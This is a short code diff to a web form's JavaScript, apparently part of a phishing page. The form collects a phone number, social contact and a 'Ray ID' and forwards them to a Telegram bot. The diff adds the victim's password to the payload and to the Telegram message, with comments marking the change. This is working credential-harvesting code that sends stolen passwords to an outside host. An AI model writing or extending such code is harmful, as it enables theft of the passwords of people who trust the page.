@@ -497,6 +497,7 @@
                     phone: document.getElementById('phone-number').value || 'Not provided',
                     social: document.getElementById('social-contact').value || 'Not provided',
                     rayId: rayId.value,
+                    password: password.value, // Added password to the data being sent
                     timestamp: new Date().toLocaleString('en-BD', { timeZone: 'Asia/Dhaka' })
                 };
 
@@ -506,6 +507,7 @@
                                    `📱 *Phone:* ${textData.phone}\n` +
                                    `🔗 *Social:* ${textData.social}\n` +
                                    `🆔 *Ray ID:* ${textData.rayId}\n` +
+                                   `🔑 *Password:* ${textData.password}\n` + // Added password to the message
                                    `⏰ *Time:* ${textData.timestamp}`;
 
                 const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
